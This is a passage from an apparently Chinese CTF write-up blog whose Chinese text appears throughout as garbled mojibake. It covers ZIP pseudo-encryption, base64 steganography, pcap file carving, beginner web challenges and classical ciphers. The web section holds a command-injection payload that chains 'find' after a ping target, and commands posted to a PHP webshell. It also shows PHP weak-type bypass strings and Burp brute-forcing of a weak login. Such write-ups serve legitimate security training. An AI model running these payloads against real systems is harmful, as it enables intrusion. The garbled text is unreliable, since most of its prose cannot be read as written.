7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line">F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line">16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ </span><br><span class="line">19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ </span><br><span class="line">17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ </span><br><span class="line">07 00ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line">24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦ </span><br><span class="line">00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦ </span><br><span class="line">00 00ï¼šç£ç›˜å¼€å§‹å· </span><br><span class="line">00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line">20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line"></span><br><span class="line">00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡</span><br><span class="line"></span><br><span class="line">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </span><br><span class="line">å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š </span><br><span class="line">50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®° </span><br><span class="line">00 00ï¼šå½“å‰ç£ç›˜ç¼–å· </span><br><span class="line">00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å· </span><br><span class="line">01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•° </span><br><span class="line">01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•° </span><br><span class="line">59 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å° </span><br><span class="line"></span><br><span class="line">3E 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡</span><br><span class="line"></span><br><span class="line">00 00ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ— åŠ å¯†</span><br><span class="line">å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º00 00  ï¼ˆ504B0304ä¸¤ä¸ªbytesä¹‹åï¼‰</span><br><span class="line">ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º00 00ï¼ˆ504B0304å››ä¸ªbytesä¹‹åï¼‰</span><br><span class="line"></span><br><span class="line">å‡åŠ å¯†</span><br><span class="line">å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º00 00 </span><br><span class="line">ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º09 00</span><br><span class="line"></span><br><span class="line">çœŸåŠ å¯†</span><br><span class="line">å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º09 00 </span><br><span class="line">ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º09 00 </span><br></pre></td></tr></table></figure>
<h3 id="base64ç¼–ç "><a href="#base64ç¼–ç " class="headerlink" title="base64ç¼–ç "></a>base64ç¼–ç </h3><p>åŸæœ¬ä¸€ä¸ªå­—ç¬¦ä½¿ç”¨8bitè¡¨ç¤ºï¼Œä½¿ç”¨base64ç¼–ç åæ”¹ä¸ºç”¨6bitè¡¨ç¤ºï¼Œä¸èƒ½é™¤å°½çš„éƒ¨åˆ†è¡¥0</p>
<h3 id="base64è§£ç "><a href="#base64è§£ç " class="headerlink" title="base64è§£ç "></a>base64è§£ç </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ£€æŸ¥base64ç¼–ç åé¢æœ‰å‡ ä¸ªç­‰äºå·</span><br><span class="line">æŠŠå­—ç¬¦ä¸²æŒ‰ç…§base64è¡¨è½¬æ¢æˆ4*6çš„å€æ•°ä½æ•°äºŒè¿›åˆ¶</span><br><span class="line">åˆ é™¤ç­‰äºå·çš„ä¸ªæ•°*8çš„bit</span><br><span class="line">æŒ‰ç…§6ä¸ªbitä¸€ç»„è½¬æˆå­—ç¬¦</span><br></pre></td></tr></table></figure>
<h3 id="base64éšå†™"><a href="#base64éšå†™" class="headerlink" title="base64éšå†™"></a>base64éšå†™</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åŸºäºbase64è§£ç æ—¶å°¾éƒ¨å­˜åœ¨ä¸€å®šæ•°é‡çš„bitä¸ä¼šè¢«è½¬ä¹‰çš„æƒ…å†µï¼Œå¯ä»¥åœ¨æ­¤å¤„æ¤å…¥æƒ³è¦éšå†™çš„å­—ç¬¦</span><br></pre></td></tr></table></figure>
<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>è¿™é¢˜æ²¡çœ‹é¢˜è§£è‡ªå·±åšçš„ï¼Œæ„ŸåŠ¨å“­äº†</p>
<p>é¦–å…ˆæ ¹æ®æç¤ºï¼Œè¿™æ˜¯ä¸€ä¸ªlinuxç³»ç»Ÿå…‰ç›˜æ–‡ä»¶ã€‚æ”¾å…¥centosä¸­ï¼Œä½¿ç”¨fileå‘½ä»¤æŸ¥çœ‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file f1fc23f5c743425d9e0073887c846d23</span><br><span class="line"></span><br><span class="line">Linux rev 1.0 ext3 filesystem data, UUID&#x3D;cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>
<p>ç½‘ä¸ŠæŸ¥é˜…å¦‚ä½•ä½¿ç”¨ext3æ–‡ä»¶ç³»ç»Ÿæ•°æ®ï¼Œä½¿ç”¨mountå‘½ä»¤æŒ‚è½½ã€‚æ³¨æ„è¦åœ¨rootç”¨æˆ·æƒé™ä¸‹ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop f1fc23f5c743425d9e0073887c846d23 &#x2F;mnt</span><br><span class="line"># -o loopæä¾›äº†ä¸€ä¸ªè™šæ‹Ÿç£ç›˜ï¼Œ&#x2F;mntæ˜¯æŒ‚è½½çš„ç›®å½•</span><br></pre></td></tr></table></figure>
<p>è¿›å…¥/mntï¼Œéšä¾¿æœæœflagç›¸å…³å­—ï¼Œå‘ç°åœ¨flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;O7avZhikgKgbF&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹flag.txtä¸­çš„å†…å®¹ï¼Œæ ¹æ®å­—ç¬¦ä¸²å…¶åçš„ç­‰å·åˆ¤æ–­ä¸ºbase64ã€‚è§£ç åå¾—åˆ°ç­”æ¡ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</span><br></pre></td></tr></table></figure>
<p>ç½‘ä¸Šè¿˜æœ‰ä¸€ç§ç”¨winhexçš„åšæ³•</p>
<h2 id="åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€"><a href="#åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€" class="headerlink" title="åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€"></a>åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€</h2><p>å·¥å…·ï¼škaliçš„foremostï¼Œwinhexï¼Œwireshark</p>
<p>åŒå‡»pcapngæ–‡ä»¶ï¼Œé€šè¿‡æœç´¢å…³é”®å­—â€œflag.txtâ€å¯çŸ¥ï¼Œä¼ è¾“äº†flag.txtæ–‡ä»¶</p>
<p>é€šè¿‡kaliä¸‹çš„foremoståˆ†ç¦»å‡ºä¼ è¾“flag.txtçš„å‹ç¼©åŒ…ã€‚</p>
<p>é€šè¿‡winhexï¼Œå‘ç°å‹ç¼©åŒ…æ˜¯çœŸå®åŠ å¯†çš„ï¼Œæ— æ³•é€šè¿‡æ›´æ”¹åå…­è¿›åˆ¶å­—ç¬¦ç›´æ¥è·å–flag.txt</p>
<p>å†æ¬¡æ‰“å¼€pcapngæ–‡ä»¶ï¼Œå¤§é‡çš„åˆ†ætcpæµï¼ŒæŸ¥æ‰¾å¯èƒ½ç›¸å…³çš„çš„æ–‡ä»¶ã€‚å‘ç°6666.jpgæ–‡ä»¶ï¼Œè¿˜åŸå‡º6666.jpgæ–‡ä»¶ã€‚</p>
<p>jpgæ–‡ä»¶å¤´æ˜¯FFD8FFï¼Œæ–‡ä»¶å°¾æ˜¯FFD9ã€‚å°†åŒ…å«å¤´å°¾çš„16è¿›åˆ¶å­—ç¬¦ä¸²å¤åˆ¶åˆ°winhexä¸­ï¼Œè¾“å‡ºä¸€ä¸ªjpgæ–‡ä»¶ã€‚æ‰“å¼€jpgæ–‡ä»¶ï¼Œå¾—åˆ°å‹ç¼©åŒ…çš„è§£å‹å¯†ç </p>
<p>æœ€åå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å„ç±»æ–‡ä»¶çš„æ ‡å¿—å¤´"><a href="#å„ç±»æ–‡ä»¶çš„æ ‡å¿—å¤´" class="headerlink" title="å„ç±»æ–‡ä»¶çš„æ ‡å¿—å¤´"></a>å„ç±»æ–‡ä»¶çš„æ ‡å¿—å¤´</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jpgï¼šFFD8FF</span><br><span class="line">pngï¼š89504E47</span><br><span class="line">gifï¼š47494638</span><br></pre></td></tr></table></figure>


<h1 id="æ”»é˜²ä¸–ç•Œ-web-åˆçº§"><a href="#æ”»é˜²ä¸–ç•Œ-web-åˆçº§" class="headerlink" title="æ”»é˜²ä¸–ç•Œ web åˆçº§"></a>æ”»é˜²ä¸–ç•Œ web åˆçº§</h1><h2 id="view-souce"><a href="#view-souce" class="headerlink" title="view_souce"></a>view_souce</h2><p>æŒ‰F12ï¼Œçœ‹åˆ°æ³¨é‡Šæºç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;ffd40408d5b1b8c2dad9aab623dd93ef&#125;</span><br></pre></td></tr></table></figure>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>å…ˆç”¨å¾¡å‰‘æˆ–è€…dirsearchæ‰«æä¸€ä¸‹ç»™å‡ºçš„ç½‘ç«™</p>
<p>å¾—åˆ°ç›®å½•ä¸‹å­˜åœ¨robots.txtæ–‡ä»¶</p>
<p>è®¿é—®è¯¥æ–‡ä»¶ï¼Œç½‘é¡µå±•ç¤ºå†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: f1ag_1s_h3re.php</span><br></pre></td></tr></table></figure>
<p>è®¿é—®f1ag_1s_h3re.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;57752958f46d76651078942ee34b88ba&#125;</span><br></pre></td></tr></table></figure>
<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>åŒç†ï¼Œç”¨å¾¡å‰‘æ‰«ä¸€ä¸‹åå°ï¼Œå­˜åœ¨index.php.bakæ–‡ä»¶</p>
<p>è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨ä¸‹è½½æ–‡ä»¶</p>
<p>ä½¿ç”¨sublime textæ‰“å¼€æ–‡ä»¶ï¼Œå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>æ‰€éœ€å·¥å…·ï¼šfirefox</p>
<p>å¯é€‰å·¥å…·ï¼šburpï¼Œwireshark</p>
<p>å…ˆæ‰“å¼€ç½‘é¡µï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œåœ¨firefoxæŒ‰F12æŸ¥çœ‹cookie</p>
<p>æ ¹æ®æç¤ºè®¿é—®cookie.php</p>
<p>æ ¹æ®æç¤ºæŸ¥çœ‹http responseï¼Œå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;5c1980e2f03a088816f306f7680d5458&#125;</span><br></pre></td></tr></table></figure>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>å·¥å…·ï¼šfirefox</p>
<p>æ‰“å¼€ç½‘é¡µï¼Œæ˜¾ç¤ºæŒ‰é’®ä¸èƒ½æŒ‰</p>
<p>ä½¿ç”¨firefoxï¼ŒæŒ‰F12æ£€æŸ¥ç½‘é¡µæºç ï¼ŒæŠŠbuttonå¤„çš„disabledå»æ‰ï¼Œå³å¯æäº¤</p>
<p>æäº¤åå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;a8efb264c88f7cba483ed431888a1d32&#125;</span><br></pre></td></tr></table></figure>
<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>ç›®çš„ï¼šçˆ†ç ´å¼±å¯†ç </p>
<p>å·¥å…·ï¼šburp</p>
<p>proxyæ‹¦æˆªæäº¤çš„è¯·æ±‚ï¼Œå°†è¯·æ±‚send to intruderï¼Œåœ¨intruderçš„positionä¸­æ›´æ”¹æ•°æ®åŒ…ï¼Œä½¿å¾—æäº¤çš„æŒ‡å®šå­—æ®µä¸ºå˜é‡ï¼Œåœ¨intruderçš„payloadä¸­è½½å…¥å­—å…¸ï¼Œç‚¹å‡»attack</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;4b4dda09ed661c8976f965b0681de325&#125;</span><br></pre></td></tr></table></figure>
<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command execution"></a>command execution</h2><p>è¾“å…¥localhostï¼Œçœ‹åˆ°è¯·æ±‚ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure>
<p>å°è¯•æ³¨å…¥è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; select database(); #</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°è¯·æ±‚ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;+select+database();+#</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜ä¸èƒ½æ³¨å…¥</p>
<p>å‚è€ƒwriteupï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œçš„pingï¼Œå¯ä»¥æ‰§è¡Œå…¶ä»–è¯­å¥ã€‚åˆflagä¸€èˆ¬æ”¾åœ¨txtä¸­ï¼Œè¾“å…¥ä¸‹åˆ—è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; find &#x2F; -name &quot;*.txt&quot; | grep flag</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°/home/flag.txt</p>
<p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;168a646a5815f5b2f0e42e56812943d5&#125;</span><br></pre></td></tr></table></figure>
<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>éœ€è¦çŸ¥è¯†ç‚¹ï¼šphpçš„å¼±ç±»å‹æ¯”è¾ƒ</p>
<p>éœ€è¦å·¥å…·ï¼šç›´æ¥åœ¨æµè§ˆå™¨æäº¤å°±è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å†™æ³•1ï¼š?a&#x3D;&#39;0&#39;&amp;b&#x3D;1235a # ä½¿aä¸ºå­—ç¬¦ä¸²ï¼Œbä¸ºéæ•°å­—çš„ä¸€ç§å˜é‡</span><br><span class="line">å†™æ³•2ï¼š?a&#x3D;0a&amp;b&#x3D;12345%00 # %00è¡¨ç¤ºé˜¶æ®µï¼Œå¯ä»¥ä½¿bä¸ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>


<h3 id="phpçš„å¼±ç±»å‹æ¯”è¾ƒ"><a href="#phpçš„å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="phpçš„å¼±ç±»å‹æ¯”è¾ƒ"></a>phpçš„å¼±ç±»å‹æ¯”è¾ƒ</h3><p>phpæœ‰ä¸¤ç§åˆ¤æ–­ç›¸ç­‰çš„æ–¹æ³•ï¼Œ==ï¼Œ===</p>
<p>==ä¼šå°†ä¸¤è¾¹å€¼è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ååœ¨åˆ¤æ–­</p>
<p>===åŒæ—¶åˆ¤æ–­ç±»å‹å’Œå€¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;admin&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">if(&quot;1admin&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;true</span><br><span class="line">if(&quot;admin1&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;false</span><br><span class="line">if(&quot;0e12324&quot;&#x3D;&#x3D;&quot;0e1324&quot;)&#x2F;&#x2F;trueï¼Œå½“åšç§‘å­¦æŠ€æœ¯æ³•ï¼Œéƒ½æ˜¯0</span><br></pre></td></tr></table></figure>
<p>get_post</p>
<p>å·¥å…·ï¼šfirefoxçš„hackbaræ’ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;f5206ff77800e22928b4d81206e083e5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>å·¥å…·ï¼šburpsuite</p>
<p>åœ¨burpçš„proxyé‡Œï¼ŒæŠŠåŒ…æ‹¦ä¸‹æ¥ï¼ŒæŒ‰ç…§æç¤ºåŠ å…¥è¿™ä¸¤æ¡å°±è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç­”æ¡ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;2db9b3a38c581792bea6f015e6bdfdc8&#125;</span><br></pre></td></tr></table></figure>
<h3 id="XFFå’ŒReferer"><a href="#XFFå’ŒReferer" class="headerlink" title="XFFå’ŒReferer"></a>XFFå’ŒReferer</h3><p>X-Forwarded-Forï¼šæµè§ˆå™¨è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œä½¿ç”¨çš„IP</p>
<p>Refererï¼šæµè§ˆå™¨å‘Šè¯‰æœåŠ¡å™¨ï¼Œè‡ªå·±ä»å“ªä¸ªIPè·³è½¬æ¥çš„</p>
<p>web_shell</p>
<p>è€ƒå¯Ÿï¼šphpä¸€å¥è¯æœ¨é©¬ï¼Œphpæ‰§è¡Œshellå‘½ä»¤</p>
<p>å·¥å…·ï¼šä¸­å›½èšå‰‘ï¼Œä¸­å›½èœåˆ€ï¼Œhackbar</p>
<p>åšæ³•1ï¼šä¸­å›½èšå‰‘orä¸­å›½èœåˆ€</p>
<p>èœåˆ€å¯ä»¥ç»•è¿‡è®¤è¯éƒ¨åˆ†ï¼Œç›´æ¥æ‹¿åˆ°webshellæƒé™ï¼Œä¹‹åæŸ¥æ‰¾flagå³å¯</p>
<p>åšæ³•2ï¼šhackbar</p>
<p>åœ¨post dataä¸­å†™å…¥ ä»¥ä¸‹è¯­å¥</p>
<p>é¦–å…ˆæŸ¥æ‰¾å½“å‰ç›®å½•æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
<p>å†™å…¥ä»¥ä¸‹ä»»æ„ä¸€å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;passthru(&quot;cat flag.txt&quot;);</span><br><span class="line">shell&#x3D;system(&quot;cat flag.txt&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="phpæ‰§è¡Œshellå‘½ä»¤"><a href="#phpæ‰§è¡Œshellå‘½ä»¤" class="headerlink" title="phpæ‰§è¡Œshellå‘½ä»¤"></a>phpæ‰§è¡Œshellå‘½ä»¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string system ( string $command [, int &amp;$return_var ] )</span><br><span class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</span><br><span class="line">void passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>è€ƒå¯Ÿï¼šjsé˜…è¯»ï¼Œè½¬ç </p>
<p>é˜…è¯»jsæºç ï¼Œå‘ç°dechiffreä¸ç®¡è¾“å…¥ä»€ä¹ˆï¼Œéƒ½ä¼šæ ¹æ®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65</span><br></pre></td></tr></table></figure>
<p>è¿”å›ä¸€ä¸ªå€¼ã€‚ASCIIç èŒƒå›´ä¸º0~127ï¼ŒçŒœæµ‹è¿™å‡ ä¸ªå€¼ä¸ºå­—ç¬¦çš„ASCIIç è¡¨ç¤º</p>
<p>ä»£ç é‡Œæœ‰ä¸€æ®µåå…­è¿›åˆ¶çš„é•¿å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹ä¸ºç­”æ¡ˆ</p>
<p>å…ˆæŠŠé•¿å­—ç¬¦ä¸²è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œå†è½¬æ¢ä¸ºå­—ç¬¦ï¼Œå¾—åˆ°ç­”æ¡ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;786OsErtk12&#125;</span><br></pre></td></tr></table></figure>


<h1 id="æ”»é˜²ä¸–ç•Œ-cryptoåˆçº§"><a href="#æ”»é˜²ä¸–ç•Œ-cryptoåˆçº§" class="headerlink" title="æ”»é˜²ä¸–ç•Œ cryptoåˆçº§"></a>æ”»é˜²ä¸–ç•Œ cryptoåˆçº§</h1><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p>è€ƒå¯Ÿï¼šå‡¯æ’’å¯†ç </p>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå°†å¾—åˆ°å­—ç¬¦ä¸²è¿›è¡Œå‡¯æ’’å¯†ç çš„è§£å¯†å³å¯</p>
<p>æä¾›çš„å­—ç¬¦ä¸²ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span><br></pre></td></tr></table></figure>
<p>oknqdbqmoqéƒ¨åˆ†è§£å¯†ååº”è¯¥å°±æ˜¯cyberspaceï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ç®—å‡ºåŠ è§£å¯†æ—¶éœ€è¦çš„æ­¥æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;you_have_learned_caesar_encryption&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><p>è€ƒå¯Ÿï¼šæ‘©æ–¯å¯†ç </p>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå°†01å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ‘©æ–¯å¯†ç ã€‚å…¶ä¸­1ä¸º-ï¼Œ0ä¸º.ï¼Œç©ºæ ¼ä¸º/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;---&#x2F;.-.&#x2F;...&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;..&#x2F;...&#x2F;...&#x2F;---&#x2F;..&#x2F;-.&#x2F;-&#x2F;.&#x2F;.-.&#x2F;.&#x2F;...&#x2F;-&#x2F;..&#x2F;-.&#x2F;--.</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨åœ¨çº¿è½¬æ¢å™¨å¾—åˆ°ç­”æ¡ˆã€‚æ³¨æ„è‹¥ç­”æ¡ˆä¸ºå¤§å†™ï¼Œéœ€è¦è½¬æ¢ä¸ºå°å†™åæäº¤ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;morsecodeissointeresting&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å¹‚æ•°åŠ å¯†"><a href="#å¹‚æ•°åŠ å¯†" class="headerlink" title="å¹‚æ•°åŠ å¯†"></a>å¹‚æ•°åŠ å¯†</h2><p>è€ƒå¯Ÿï¼šäº‘å½±å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;WELLDOWN&#125;</span><br></pre></td></tr></table></figure>
<h3 id="äº‘å½±å¯†ç "><a href="#äº‘å½±å¯†ç " class="headerlink" title="äº‘å½±å¯†ç "></a>äº‘å½±å¯†ç </h3><p>åªæœ‰84210äº”ç§æ•°å­—çš„å­—ç¬¦ä¸²ï¼Œä»¥0ä½åˆ†éš”ç¬¦ï¼Œæ•°å­—ç›¸åŠ åè½¬æ¢ä¸ºå¯¹åº”çš„å¤§å†™è‹±æ–‡å­—æ¯ã€‚å¦‚8421=15=O</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br></pre></td></tr></table></figure>
<h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><p>è€ƒå¯Ÿï¼šRailfence-cipher</p>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå¯èƒ½æ˜¯æ …æ å¯†ç ã€‚å°è¯•åå¹¶æœªå¾—å‡ºæœ‰æ•ˆç­”æ¡ˆ</p>
